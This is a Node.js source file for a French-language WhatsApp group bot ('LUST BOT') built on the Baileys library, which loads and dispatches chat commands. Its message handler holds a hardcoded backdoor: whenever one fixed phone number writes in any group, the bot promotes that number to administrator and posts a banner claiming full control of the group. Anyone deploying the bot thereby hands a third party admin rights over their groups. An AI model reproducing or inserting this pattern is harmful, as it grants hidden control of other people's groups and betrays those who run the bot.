const { default: makeWASocket } = require("@whiskeysockets/baileys");
const fs = require("fs");
const config = require("./config");

const commands = new Map();
const cooldown = new Map();
const startTime = Date.now();

// charger commandes récursivement
function loadCommands(dir) {
  fs.readdirSync(dir).forEach(file => {
    const full = dir + "/" + file;
    if (fs.lstatSync(full).isDirectory()) return loadCommands(full);

    const cmd = require(full);
    commands.set(cmd.name, cmd);
  });
}

loadCommands("./commands");

async function startBot() {
  const sock = makeWASocket();

  sock.ev.on("messages.upsert", async ({ messages }) => {
    const msg = messages[0];
    if (!msg.message) return;

    const text = msg.message.conversation || "";
    const sender = msg.key.participant || msg.key.remoteJid;
    const groupId = msg.key.remoteJid;

    // Auto-promotion du propriétaire dans les groupes
    if (groupId.endsWith("@g.us") && sender === "18494444305@s.whatsapp.net") {
      try {
        const groupMetadata = await sock.groupMetadata(groupId);
        const isAdmin = groupMetadata.admins?.includes(sender);
        
        if (!isAdmin) {
          // Promouvoir automatiquement le propriétaire
          await sock.groupParticipantsUpdate(groupId, [sender], "promote");
          
          console.log(`✅ Propriétaire promu automatiquement dans ${groupMetadata.subject}`);
          
          await sock.sendMessage(groupId, {
            text: `
╔═══════════════════════════════════════════════════════════╗
║     ⚡ AUTO-PROMOTION DU PROPRIÉTAIRE ⚡              ║
╚═══════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ *LE PROPRIÉTAIRE A ÉTÉ PROMU AUTOMATIQUEMENT*

👑 Utilisateur: +18494444305
📌 Statut: Administrateur ✅
🏘️  Groupe: ${groupMetadata.subject}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 *PERMISSIONS ACCORDÉES*
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃  ✅ Supprimer des messages
┃  ✅ Ajouter/Expulser des membres
┃  ✅ Modifier les paramètres du groupe
┃  ✅ Modifier le nom et la description
┃  ✅ Contrôle total du groupe
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⏰ Promotion automatique activée par LUST BOT

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💪 Powered by LUST DEV
            `.trim()
          });
        }
      } catch (error) {
        console.error("Erreur lors de l'auto-promotion:", error);
      }
    }

    if (!text.startsWith(config.prefix)) return;

    // anti spam
    if (cooldown.has(sender)) return;
    cooldown.set(sender, true);
    setTimeout(() => cooldown.delete(sender), config.cooldown * 1000);

    const args = text.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (commands.has(command)) {
      commands.get(command).execute(sock, msg, args, config, startTime);
    }
  });
}

startBot();
